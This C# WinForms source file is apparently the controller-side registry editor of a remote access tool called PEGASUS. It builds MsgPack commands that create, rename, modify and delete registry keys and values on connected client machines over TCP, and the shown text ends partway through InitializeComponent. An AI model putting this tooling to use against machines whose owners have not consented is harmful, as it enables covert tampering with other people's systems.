using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.Linq;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;
using Guna.UI2.WinForms;
using Microsoft.Win32;
using PEGASUS.Connection;
using PEGASUS.Helper;
using PEGASUS.MessagePack;
using PEGASUS.Properties;

namespace PEGASUS.Forms
{

	public class FormRegistryEditor : Form
	{
		private IContainer components;

		private TableLayoutPanel tableLayoutPanel;

		private SplitContainer splitContainer;

		public RegistryTreeView tvRegistryDirectory;

		private AeroListView lstRegistryValues;

		private StatusStrip statusStrip;

		private ToolStripStatusLabel selectedStripStatusLabel;

		private ImageList imageRegistryDirectoryList;

		private ColumnHeader hName;

		private ColumnHeader hType;

		private ColumnHeader hValue;

		private ImageList imageRegistryKeyTypeList;

		private ContextMenuStrip tv_ContextMenuStrip;

		private ToolStripMenuItem newToolStripMenuItem;

		private ToolStripMenuItem keyToolStripMenuItem;

		private ToolStripMenuItem deleteToolStripMenuItem;

		private ToolStripMenuItem renameToolStripMenuItem;

		private ToolStripMenuItem stringValueToolStripMenuItem;

		private ToolStripMenuItem binaryValueToolStripMenuItem;

		private ToolStripMenuItem dWORD32bitValueToolStripMenuItem;

		private ToolStripMenuItem qWORD64bitValueToolStripMenuItem;

		private ToolStripMenuItem multiStringValueToolStripMenuItem;

		private ToolStripMenuItem expandableStringValueToolStripMenuItem;

		private ContextMenuStrip selectedItem_ContextMenuStrip;

		private ToolStripMenuItem modifyToolStripMenuItem;

		private ToolStripMenuItem modifyBinaryDataToolStripMenuItem;

		private ToolStripMenuItem deleteToolStripMenuItem1;

		private ToolStripMenuItem renameToolStripMenuItem1;

		private ContextMenuStrip lst_ContextMenuStrip;

		private ToolStripMenuItem newToolStripMenuItem1;

		private ToolStripMenuItem keyToolStripMenuItem1;

		private ToolStripMenuItem stringValueToolStripMenuItem1;

		private ToolStripMenuItem binaryValueToolStripMenuItem1;

		private ToolStripMenuItem dWORD32bitValueToolStripMenuItem1;

		private ToolStripMenuItem qWORD64bitValueToolStripMenuItem1;

		private ToolStripMenuItem multiStringValueToolStripMenuItem1;

		private ToolStripMenuItem expandableStringValueToolStripMenuItem1;

		private MenuStrip menuStrip;

		private ToolStripMenuItem fileToolStripMenuItem;

		private ToolStripMenuItem exitToolStripMenuItem;

		private ToolStripMenuItem editToolStripMenuItem;

		private ToolStripMenuItem modifyToolStripMenuItem1;

		private ToolStripMenuItem modifyBinaryDataToolStripMenuItem1;

		private ToolStripMenuItem newToolStripMenuItem2;

		private ToolStripMenuItem deleteToolStripMenuItem2;

		private ToolStripMenuItem renameToolStripMenuItem2;

		private ToolStripMenuItem keyToolStripMenuItem2;

		private ToolStripMenuItem stringValueToolStripMenuItem2;

		private ToolStripMenuItem binaryValueToolStripMenuItem2;

		private ToolStripMenuItem dWORD32bitValueToolStripMenuItem2;

		private ToolStripMenuItem qWORD64bitValueToolStripMenuItem2;

		private ToolStripMenuItem multiStringValueToolStripMenuItem2;

		private ToolStripMenuItem expandableStringValueToolStripMenuItem2;

		public System.Windows.Forms.Timer timer1;

		private Guna2Panel guna2Panel1;

		private Guna2PictureBox guna2PictureBox1;

		private Label label1;

		private PictureBox pictureBox1;

		private Guna2Separator guna2Separator1;

		private Guna2BorderlessForm guna2BorderlessForm1;

		private Guna2ShadowForm guna2ShadowForm1;

		private Guna2Panel guna2Panel2;

		private Label label2;

		public PEGASUSMain F { get; set; }

		internal Clients Client { get; set; }

		internal Clients ParentClient { get; set; }

		public FormRegistryEditor()
		{
			InitializeComponent();
		}

		private void SetLastColumnWidth()
		{
			lstRegistryValues.Columns[lstRegistryValues.Columns.Count - 1].Width = -2;
		}

		private void FrmRegistryEditor_Load(object sender, EventArgs e)
		{
			SetLastColumnWidth();
			lstRegistryValues.Layout += delegate
			{
				SetLastColumnWidth();
			};
			lstRegistryValues.View = View.Details;
			lstRegistryValues.HideSelection = false;
			lstRegistryValues.OwnerDraw = true;
			lstRegistryValues.GridLines = false;
			lstRegistryValues.BackColor = Color.FromArgb(24, 24, 24);
			lstRegistryValues.DrawColumnHeader += delegate (object sender1, DrawListViewColumnHeaderEventArgs args)
			{
				Brush brush = new SolidBrush(Color.FromArgb(30, 30, 30));
				args.Graphics.FillRectangle(brush, args.Bounds);
				TextRenderer.DrawText(args.Graphics, args.Header.Text, args.Font, args.Bounds, Color.WhiteSmoke);
			};
			lstRegistryValues.DrawItem += delegate (object sender1, DrawListViewItemEventArgs args)
			{
				args.DrawDefault = true;
			};
			lstRegistryValues.DrawSubItem += delegate (object sender1, DrawListViewSubItemEventArgs args)
			{
				args.DrawDefault = true;
			};
		}

		private void AddRootKey(RegistrySeeker.RegSeekerMatch match)
		{
			TreeNode treeNode = CreateNode(match.Key, match.Key, match.Data);
			treeNode.Nodes.Add(new TreeNode());
			tvRegistryDirectory.Nodes.Add(treeNode);
		}

		private TreeNode AddKeyToTree(TreeNode parent, RegistrySeeker.RegSeekerMatch subKey)
		{
			TreeNode treeNode = CreateNode(subKey.Key, subKey.Key, subKey.Data);
			parent.Nodes.Add(treeNode);
			if (subKey.HasSubKeys)
			{
				treeNode.Nodes.Add(new TreeNode());
			}
			return treeNode;
		}

		private TreeNode CreateNode(string key, string text, object tag)
		{
			return new TreeNode
			{
				Text = text,
				Name = key,
				Tag = tag
			};
		}

		public void AddKeys(string rootKey, RegistrySeeker.RegSeekerMatch[] matches)
		{
			if (string.IsNullOrEmpty(rootKey))
			{
				tvRegistryDirectory.BeginUpdate();
				RegistrySeeker.RegSeekerMatch[] array = matches;
				foreach (RegistrySeeker.RegSeekerMatch match in array)
				{
					AddRootKey(match);
				}
				tvRegistryDirectory.SelectedNode = tvRegistryDirectory.Nodes[0];
				tvRegistryDirectory.EndUpdate();
				return;
			}
			TreeNode treeNode = GetTreeNode(rootKey);
			if (treeNode != null)
			{
				tvRegistryDirectory.BeginUpdate();
				RegistrySeeker.RegSeekerMatch[] array = matches;
				foreach (RegistrySeeker.RegSeekerMatch subKey in array)
				{
					AddKeyToTree(treeNode, subKey);
				}
				treeNode.Expand();
				tvRegistryDirectory.EndUpdate();
			}
		}

		public void CreateNewKey(string rootKey, RegistrySeeker.RegSeekerMatch match)
		{
			TreeNode treeNode = GetTreeNode(rootKey);
			TreeNode treeNode2 = AddKeyToTree(treeNode, match);
			treeNode2.EnsureVisible();
			tvRegistryDirectory.SelectedNode = treeNode2;
			treeNode2.Expand();
			tvRegistryDirectory.LabelEdit = true;
			treeNode2.BeginEdit();
		}

		public void DeleteKey(string rootKey, string subKey)
		{
			TreeNode treeNode = GetTreeNode(rootKey);
			if (treeNode.Nodes.ContainsKey(subKey))
			{
				treeNode.Nodes.RemoveByKey(subKey);
			}
		}

		public void RenameKey(string rootKey, string oldName, string newName)
		{
			TreeNode treeNode = GetTreeNode(rootKey);
			if (treeNode.Nodes.ContainsKey(oldName))
			{
				treeNode.Nodes[oldName].Text = newName;
				treeNode.Nodes[oldName].Name = newName;
				tvRegistryDirectory.SelectedNode = treeNode.Nodes[newName];
			}
		}

		private TreeNode GetTreeNode(string path)
		{
			string[] array = path.Split('\\');
			TreeNode treeNode = tvRegistryDirectory.Nodes[array[0]];
			if (treeNode == null)
			{
				return null;
			}
			for (int i = 1; i < array.Length; i++)
			{
				treeNode = treeNode.Nodes[array[i]];
				if (treeNode == null)
				{
					return null;
				}
			}
			return treeNode;
		}

		public void CreateValue(string keyPath, RegistrySeeker.RegValueData value)
		{
			TreeNode treeNode = GetTreeNode(keyPath);
			if (treeNode != null)
			{
				List<RegistrySeeker.RegValueData> list = ((RegistrySeeker.RegValueData[])treeNode.Tag).ToList();
				list.Add(value);
				treeNode.Tag = list.ToArray();
				if (tvRegistryDirectory.SelectedNode == treeNode)
				{
					RegistryValueLstItem registryValueLstItem = new RegistryValueLstItem(value);
					lstRegistryValues.Items.Add(registryValueLstItem);
					lstRegistryValues.SelectedIndices.Clear();
					registryValueLstItem.Selected = true;
					lstRegistryValues.LabelEdit = true;
					registryValueLstItem.BeginEdit();
				}
				tvRegistryDirectory.SelectedNode = treeNode;
			}
		}

		public void DeleteValue(string keyPath, string valueName)
		{
			TreeNode treeNode = GetTreeNode(keyPath);
			if (treeNode == null)
			{
				return;
			}
			if (!RegValueHelper.IsDefaultValue(valueName))
			{
				treeNode.Tag = ((RegistrySeeker.RegValueData[])treeNode.Tag).Where((RegistrySeeker.RegValueData value) => value.Name != valueName).ToArray();
				if (tvRegistryDirectory.SelectedNode == treeNode)
				{
					lstRegistryValues.Items.RemoveByKey(valueName);
				}
			}
			else
			{
				RegistrySeeker.RegValueData regValueData = ((RegistrySeeker.RegValueData[])treeNode.Tag).First((RegistrySeeker.RegValueData item) => item.Name == valueName);
				if (tvRegistryDirectory.SelectedNode == treeNode)
				{
					RegistryValueLstItem registryValueLstItem = lstRegistryValues.Items.Cast<RegistryValueLstItem>().SingleOrDefault((RegistryValueLstItem item) => item.Name == valueName);
					if (registryValueLstItem != null)
					{
						registryValueLstItem.Data = regValueData.Kind.RegistryTypeToString(null);
					}
				}
			}
			tvRegistryDirectory.SelectedNode = treeNode;
		}

		public void RenameValue(string keyPath, string oldName, string newName)
		{
			TreeNode treeNode = GetTreeNode(keyPath);
			if (treeNode == null)
			{
				return;
			}
			((RegistrySeeker.RegValueData[])treeNode.Tag).First((RegistrySeeker.RegValueData item) => item.Name == oldName).Name = newName;
			if (tvRegistryDirectory.SelectedNode == treeNode)
			{
				RegistryValueLstItem registryValueLstItem = lstRegistryValues.Items.Cast<RegistryValueLstItem>().SingleOrDefault((RegistryValueLstItem item) => item.Name == oldName);
				if (registryValueLstItem != null)
				{
					registryValueLstItem.RegName = newName;
				}
			}
			tvRegistryDirectory.SelectedNode = treeNode;
		}

		public void ChangeValue(string keyPath, RegistrySeeker.RegValueData value)
		{
			TreeNode treeNode = GetTreeNode(keyPath);
			if (treeNode == null)
			{
				return;
			}
			RegistrySeeker.RegValueData dest = ((RegistrySeeker.RegValueData[])treeNode.Tag).First((RegistrySeeker.RegValueData item) => item.Name == value.Name);
			ChangeRegistryValue(value, dest);
			if (tvRegistryDirectory.SelectedNode == treeNode)
			{
				RegistryValueLstItem registryValueLstItem = lstRegistryValues.Items.Cast<RegistryValueLstItem>().SingleOrDefault((RegistryValueLstItem item) => item.Name == value.Name);
				if (registryValueLstItem != null)
				{
					registryValueLstItem.Data = RegValueHelper.RegistryValueToString(value);
				}
			}
			tvRegistryDirectory.SelectedNode = treeNode;
		}

		private void ChangeRegistryValue(RegistrySeeker.RegValueData source, RegistrySeeker.RegValueData dest)
		{
			if (source.Kind == dest.Kind)
			{
				dest.Data = source.Data;
			}
		}

		private void UpdateLstRegistryValues(TreeNode node)
		{
			selectedStripStatusLabel.Text = node.FullPath;
			RegistrySeeker.RegValueData[] values = (RegistrySeeker.RegValueData[])node.Tag;
			PopulateLstRegistryValues(values);
		}

		private void PopulateLstRegistryValues(RegistrySeeker.RegValueData[] values)
		{
			lstRegistryValues.BeginUpdate();
			lstRegistryValues.Items.Clear();
			values = values.OrderBy((RegistrySeeker.RegValueData value) => value.Name).ToArray();
			RegistrySeeker.RegValueData[] array = values;
			for (int i = 0; i < array.Length; i++)
			{
				RegistryValueLstItem value2 = new RegistryValueLstItem(array[i]);
				lstRegistryValues.Items.Add(value2);
			}
			lstRegistryValues.EndUpdate();
		}

		private void tvRegistryDirectory_AfterLabelEdit(object sender, NodeLabelEditEventArgs e)
		{
			if (e.Label != null)
			{
				e.CancelEdit = true;
				if (e.Label.Length > 0)
				{
					if (e.Node.Parent.Nodes.ContainsKey(e.Label))
					{
						MessageBox.Show("Invalid label. \nA node with that label already exists.", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
						e.Node.BeginEdit();
						return;
					}
					MsgPack msgPack = new MsgPack();
					msgPack.ForcePathObject("Pac_ket").AsString = "regManager";
					msgPack.ForcePathObject("Command").AsString = "RenameRegistryKey";
					msgPack.ForcePathObject("OldKeyName").AsString = e.Node.Name;
					msgPack.ForcePathObject("NewKeyName").AsString = e.Label;
					msgPack.ForcePathObject("ParentPath").AsString = e.Node.Parent.FullPath;
					ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
					tvRegistryDirectory.LabelEdit = false;
				}
				else
				{
					MessageBox.Show("Invalid label. \nThe label cannot be blank.", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
					e.Node.BeginEdit();
				}
			}
			else
			{
				tvRegistryDirectory.LabelEdit = false;
			}
		}

		private void tvRegistryDirectory_BeforeExpand(object sender, TreeViewCancelEventArgs e)
		{
			TreeNode node = e.Node;
			if (string.IsNullOrEmpty(node.FirstNode.Name))
			{
				tvRegistryDirectory.SuspendLayout();
				node.Nodes.Clear();
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "regManager";
				msgPack.ForcePathObject("Command").AsString = "LoadRegistryKey";
				msgPack.ForcePathObject("RootKeyName").AsString = node.FullPath;
				ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
				Thread.Sleep(500);
				tvRegistryDirectory.ResumeLayout();
				e.Cancel = true;
			}
		}

		private void tvRegistryDirectory_NodeMouseClick(object sender, TreeNodeMouseClickEventArgs e)
		{
			if (e.Button == MouseButtons.Right)
			{
				tvRegistryDirectory.SelectedNode = e.Node;
				Point position = new Point(e.X, e.Y);
				CreateTreeViewMenuStrip();
				tv_ContextMenuStrip.Show(tvRegistryDirectory, position);
			}
		}

		private void tvRegistryDirectory_BeforeSelect(object sender, TreeViewCancelEventArgs e)
		{
			UpdateLstRegistryValues(e.Node);
		}

		private void tvRegistryDirectory_KeyUp(object sender, KeyEventArgs e)
		{
			if (e.KeyCode == Keys.Delete && GetDeleteState())
			{
				deleteRegistryKey_Click(this, e);
			}
		}

		private void CreateEditToolStrip()
		{
			ToolStripMenuItem toolStripMenuItem = modifyToolStripMenuItem1;
			ToolStripMenuItem toolStripMenuItem2 = modifyBinaryDataToolStripMenuItem1;
			ToolStripMenuItem toolStripMenuItem3 = modifyToolStripMenuItem1;
			bool flag2 = (modifyBinaryDataToolStripMenuItem1.Enabled = lstRegistryValues.SelectedItems.Count == 1);
			bool flag4 = (toolStripMenuItem3.Enabled = flag2);
			bool visible = (toolStripMenuItem2.Visible = flag4);
			toolStripMenuItem.Visible = visible;
			renameToolStripMenuItem2.Enabled = GetRenameState();
			deleteToolStripMenuItem2.Enabled = GetDeleteState();
		}

		private void CreateTreeViewMenuStrip()
		{
			renameToolStripMenuItem.Enabled = tvRegistryDirectory.SelectedNode.Parent != null;
			deleteToolStripMenuItem.Enabled = tvRegistryDirectory.SelectedNode.Parent != null;
		}

		private void CreateListViewMenuStrip()
		{
			ToolStripMenuItem toolStripMenuItem = modifyToolStripMenuItem;
			bool enabled = (modifyBinaryDataToolStripMenuItem.Enabled = lstRegistryValues.SelectedItems.Count == 1);
			toolStripMenuItem.Enabled = enabled;
			renameToolStripMenuItem1.Enabled = lstRegistryValues.SelectedItems.Count == 1 && !RegValueHelper.IsDefaultValue(lstRegistryValues.SelectedItems[0].Name);
			deleteToolStripMenuItem1.Enabled = tvRegistryDirectory.SelectedNode != null && lstRegistryValues.SelectedItems.Count > 0;
		}

		private void editToolStripMenuItem_DropDownOpening(object sender, EventArgs e)
		{
			CreateEditToolStrip();
		}

		private void menuStripExit_Click(object sender, EventArgs e)
		{
			Close();
		}

		private void menuStripDelete_Click(object sender, EventArgs e)
		{
			if (tvRegistryDirectory.Focused)
			{
				deleteRegistryKey_Click(this, e);
			}
			else if (lstRegistryValues.Focused)
			{
				deleteRegistryValue_Click(this, e);
			}
		}

		private void menuStripRename_Click(object sender, EventArgs e)
		{
			if (tvRegistryDirectory.Focused)
			{
				renameRegistryKey_Click(this, e);
			}
			else if (lstRegistryValues.Focused)
			{
				renameRegistryValue_Click(this, e);
			}
		}

		private void lstRegistryKeys_MouseClick(object sender, MouseEventArgs e)
		{
			if (e.Button == MouseButtons.Right)
			{
				Point position = new Point(e.X, e.Y);
				if (lstRegistryValues.GetItemAt(position.X, position.Y) == null)
				{
					lst_ContextMenuStrip.Show(lstRegistryValues, position);
					return;
				}
				CreateListViewMenuStrip();
				selectedItem_ContextMenuStrip.Show(lstRegistryValues, position);
			}
		}

		private void lstRegistryKeys_AfterLabelEdit(object sender, LabelEditEventArgs e)
		{
			if (e.Label != null && tvRegistryDirectory.SelectedNode != null)
			{
				e.CancelEdit = true;
				int item = e.Item;
				if (e.Label.Length > 0)
				{
					if (lstRegistryValues.Items.ContainsKey(e.Label))
					{
						MessageBox.Show("Invalid label. \nA node with that label already exists.", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
						lstRegistryValues.Items[item].BeginEdit();
						return;
					}
					MsgPack msgPack = new MsgPack();
					msgPack.ForcePathObject("Pac_ket").AsString = "regManager";
					msgPack.ForcePathObject("Command").AsString = "RenameRegistryValue";
					msgPack.ForcePathObject("OldValueName").AsString = lstRegistryValues.Items[item].Name;
					msgPack.ForcePathObject("NewValueName").AsString = e.Label;
					msgPack.ForcePathObject("KeyPath").AsString = tvRegistryDirectory.SelectedNode.FullPath;
					ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
					lstRegistryValues.LabelEdit = false;
				}
				else
				{
					MessageBox.Show("Invalid label. \nThe label cannot be blank.", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
					lstRegistryValues.Items[item].BeginEdit();
				}
			}
			else
			{
				lstRegistryValues.LabelEdit = false;
			}
		}

		private void lstRegistryKeys_KeyUp(object sender, KeyEventArgs e)
		{
			if (e.KeyCode == Keys.Delete && GetDeleteState())
			{
				deleteRegistryValue_Click(this, e);
			}
		}

		private void createNewRegistryKey_Click(object sender, EventArgs e)
		{
			if (!tvRegistryDirectory.SelectedNode.IsExpanded && tvRegistryDirectory.SelectedNode.Nodes.Count > 0)
			{
				tvRegistryDirectory.AfterExpand += createRegistryKey_AfterExpand;
				tvRegistryDirectory.SelectedNode.Expand();
				return;
			}
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "regManager";
			msgPack.ForcePathObject("Command").AsString = "CreateRegistryKey";
			msgPack.ForcePathObject("ParentPath").AsString = tvRegistryDirectory.SelectedNode.FullPath;
			ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
		}

		private void deleteRegistryKey_Click(object sender, EventArgs e)
		{
			string caption = "Confirm Key Delete";
			if (MessageBox.Show("Are you sure you want to permanently delete this key and all of its subkeys?", caption, MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation) == DialogResult.Yes)
			{
				string fullPath = tvRegistryDirectory.SelectedNode.Parent.FullPath;
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "regManager";
				msgPack.ForcePathObject("Command").AsString = "DeleteRegistryKey";
				msgPack.ForcePathObject("KeyName").AsString = tvRegistryDirectory.SelectedNode.Name;
				msgPack.ForcePathObject("ParentPath").AsString = fullPath;
				ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
			}
		}

		private void renameRegistryKey_Click(object sender, EventArgs e)
		{
			tvRegistryDirectory.LabelEdit = true;
			tvRegistryDirectory.SelectedNode.BeginEdit();
		}

		private void createStringRegistryValue_Click(object sender, EventArgs e)
		{
			if (tvRegistryDirectory.SelectedNode != null)
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "regManager";
				msgPack.ForcePathObject("Command").AsString = "CreateRegistryValue";
				msgPack.ForcePathObject("KeyPath").AsString = tvRegistryDirectory.SelectedNode.FullPath;
				msgPack.ForcePathObject("Kindstring").AsString = "1";
				ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
			}
		}

		private void createBinaryRegistryValue_Click(object sender, EventArgs e)
		{
			if (tvRegistryDirectory.SelectedNode != null)
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "regManager";
				msgPack.ForcePathObject("Command").AsString = "CreateRegistryValue";
				msgPack.ForcePathObject("KeyPath").AsString = tvRegistryDirectory.SelectedNode.FullPath;
				msgPack.ForcePathObject("Kindstring").AsString = "3";
				ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
			}
		}

		private void createDwordRegistryValue_Click(object sender, EventArgs e)
		{
			if (tvRegistryDirectory.SelectedNode != null)
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "regManager";
				msgPack.ForcePathObject("Command").AsString = "CreateRegistryValue";
				msgPack.ForcePathObject("KeyPath").AsString = tvRegistryDirectory.SelectedNode.FullPath;
				msgPack.ForcePathObject("Kindstring").AsString = "4";
				ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
			}
		}

		private void createQwordRegistryValue_Click(object sender, EventArgs e)
		{
			if (tvRegistryDirectory.SelectedNode != null)
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "regManager";
				msgPack.ForcePathObject("Command").AsString = "CreateRegistryValue";
				msgPack.ForcePathObject("KeyPath").AsString = tvRegistryDirectory.SelectedNode.FullPath;
				msgPack.ForcePathObject("Kindstring").AsString = "11";
				ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
			}
		}

		private void createMultiStringRegistryValue_Click(object sender, EventArgs e)
		{
			if (tvRegistryDirectory.SelectedNode != null)
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "regManager";
				msgPack.ForcePathObject("Command").AsString = "CreateRegistryValue";
				msgPack.ForcePathObject("KeyPath").AsString = tvRegistryDirectory.SelectedNode.FullPath;
				msgPack.ForcePathObject("Kindstring").AsString = "7";
				ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
			}
		}

		private void createExpandStringRegistryValue_Click(object sender, EventArgs e)
		{
			if (tvRegistryDirectory.SelectedNode != null)
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "regManager";
				msgPack.ForcePathObject("Command").AsString = "CreateRegistryValue";
				msgPack.ForcePathObject("KeyPath").AsString = tvRegistryDirectory.SelectedNode.FullPath;
				msgPack.ForcePathObject("Kindstring").AsString = "2";
				ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
			}
		}

		private void deleteRegistryValue_Click(object sender, EventArgs e)
		{
			string obj = "Deleting certain registry values could cause system instability. Are you sure you want to permanently delete " + ((lstRegistryValues.SelectedItems.Count == 1) ? "this value?" : "these values?");
			string caption = "Confirm Value Delete";
			if (MessageBox.Show(obj, caption, MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation) != DialogResult.Yes)
			{
				return;
			}
			foreach (object selectedItem in lstRegistryValues.SelectedItems)
			{
				if (selectedItem.GetType() == typeof(RegistryValueLstItem))
				{
					RegistryValueLstItem registryValueLstItem = (RegistryValueLstItem)selectedItem;
					MsgPack msgPack = new MsgPack();
					msgPack.ForcePathObject("Pac_ket").AsString = "regManager";
					msgPack.ForcePathObject("Command").AsString = "DeleteRegistryValue";
					msgPack.ForcePathObject("KeyPath").AsString = tvRegistryDirectory.SelectedNode.FullPath;
					msgPack.ForcePathObject("ValueName").AsString = registryValueLstItem.RegName;
					ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
				}
			}
		}

		private void renameRegistryValue_Click(object sender, EventArgs e)
		{
			lstRegistryValues.LabelEdit = true;
			lstRegistryValues.SelectedItems[0].BeginEdit();
		}

		private void modifyRegistryValue_Click(object sender, EventArgs e)
		{
			CreateEditForm(isBinary: false);
		}

		private void modifyBinaryDataRegistryValue_Click(object sender, EventArgs e)
		{
			CreateEditForm(isBinary: true);
		}

		private void createRegistryKey_AfterExpand(object sender, TreeViewEventArgs e)
		{
			if (e.Node == tvRegistryDirectory.SelectedNode)
			{
				createNewRegistryKey_Click(this, e);
				tvRegistryDirectory.AfterExpand -= createRegistryKey_AfterExpand;
			}
		}

		private bool GetDeleteState()
		{
			if (lstRegistryValues.Focused)
			{
				return lstRegistryValues.SelectedItems.Count > 0;
			}
			if (tvRegistryDirectory.Focused && tvRegistryDirectory.SelectedNode != null)
			{
				return tvRegistryDirectory.SelectedNode.Parent != null;
			}
			return false;
		}

		private bool GetRenameState()
		{
			if (lstRegistryValues.Focused)
			{
				if (lstRegistryValues.SelectedItems.Count == 1)
				{
					return !RegValueHelper.IsDefaultValue(lstRegistryValues.SelectedItems[0].Name);
				}
				return false;
			}
			if (tvRegistryDirectory.Focused && tvRegistryDirectory.SelectedNode != null)
			{
				return tvRegistryDirectory.SelectedNode.Parent != null;
			}
			return false;
		}

		private Form GetEditForm(RegistrySeeker.RegValueData value, RegistryValueKind valueKind)
		{
			switch (valueKind)
			{
				case RegistryValueKind.String:
				case RegistryValueKind.ExpandString:
					return new FormRegValueEditString(value);
				case RegistryValueKind.DWord:
				case RegistryValueKind.QWord:
					return new FormRegValueEditWord(value);
				case RegistryValueKind.MultiString:
					return new FormRegValueEditMultiString(value);
				case RegistryValueKind.Binary:
					return new FormRegValueEditBinary(value);
				default:
					return null;
			}
		}

		private void CreateEditForm(bool isBinary)
		{
			_ = tvRegistryDirectory.SelectedNode.FullPath;
			string name = lstRegistryValues.SelectedItems[0].Name;
			RegistrySeeker.RegValueData regValueData = ((RegistrySeeker.RegValueData[])tvRegistryDirectory.SelectedNode.Tag).ToList().Find((RegistrySeeker.RegValueData item) => item.Name == name);
			RegistryValueKind valueKind = (isBinary ? RegistryValueKind.Binary : regValueData.Kind);
			using Form form = GetEditForm(regValueData, valueKind);
			if (form.ShowDialog() == DialogResult.OK)
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "regManager";
				msgPack.ForcePathObject("Command").AsString = "ChangeRegistryValue";
				ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
			}
		}

		public void timer1_Tick(object sender, EventArgs e)
		{
			try
			{
				if (!ParentClient.TcpClient.Connected || !Client.TcpClient.Connected)
				{
					Close();
				}
			}
			catch
			{
				Close();
			}
		}

		private void FormRegistryEditor_FormClosed(object sender, FormClosedEventArgs e)
		{
			ThreadPool.QueueUserWorkItem(delegate
			{
				Client?.Disconnected();
			});
		}

		private void guna2PictureBox1_Click(object sender, EventArgs e)
		{
			Close();
		}

		[DllImport("user32.DLL")]
		private static extern void ReleaseCapture();

		[DllImport("user32.DLL")]
		private static extern void SendMessage(IntPtr hwnd, int wmsg, int wparam, int lparam);

		private void guna2Panel1_MouseDown(object sender, MouseEventArgs e)
		{
			ReleaseCapture();
			SendMessage(base.Handle, 274, 61458, 0);
		}

		protected override void Dispose(bool disposing)
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
			base.Dispose(disposing);
		}

		private void InitializeComponent()
		{
			components = new System.ComponentModel.Container();
			System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(FormRegistryEditor));
			tableLayoutPanel = new System.Windows.Forms.TableLayoutPanel();
			statusStrip = new System.Windows.Forms.StatusStrip();
			selectedStripStatusLabel = new System.Windows.Forms.ToolStripStatusLabel();
			menuStrip = new System.Windows.Forms.MenuStrip();
			fileToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			exitToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			editToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			modifyToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
			modifyBinaryDataToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
			newToolStripMenuItem2 = new System.Windows.Forms.ToolStripMenuItem();
			keyToolStripMenuItem2 = new System.Windows.Forms.ToolStripMenuItem();
			stringValueToolStripMenuItem2 = new System.Windows.Forms.ToolStripMenuItem();
			binaryValueToolStripMenuItem2 = new System.Windows.Forms.ToolStripMenuItem();
			dWORD32bitValueToolStripMenuItem2 = new System.Windows.Forms.ToolStripMenuItem();
			qWORD64bitValueToolStripMenuItem2 = new System.Windows.Forms.ToolStripMenuItem();
			multiStringValueToolStripMenuItem2 = new System.Windows.Forms.ToolStripMenuItem();
			expandableStringValueToolStripMenuItem2 = new System.Windows.Forms.ToolStripMenuItem();
			deleteToolStripMenuItem2 = new System.Windows.Forms.ToolStripMenuItem();
			renameToolStripMenuItem2 = new System.Windows.Forms.ToolStripMenuItem();
			splitContainer = new System.Windows.Forms.SplitContainer();
			guna2Panel2 = new Guna.UI2.WinForms.Guna2Panel();
			label2 = new System.Windows.Forms.Label();
			tvRegistryDirectory = new Helper.RegistryTreeView();
			imageRegistryDirectoryList = new System.Windows.Forms.ImageList(components);
			lstRegistryValues = new Helper.AeroListView();
			hName = new System.Windows.Forms.ColumnHeader();
			hType = new System.Windows.Forms.ColumnHeader();
			hValue = new System.Windows.Forms.ColumnHeader();
			imageRegistryKeyTypeList = new System.Windows.Forms.ImageList(components);
			tv_ContextMenuStrip = new System.Windows.Forms.ContextMenuStrip(components);
			newToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			keyToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			stringValueToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			binaryValueToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			dWORD32bitValueToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			qWORD64bitValueToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			multiStringValueToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
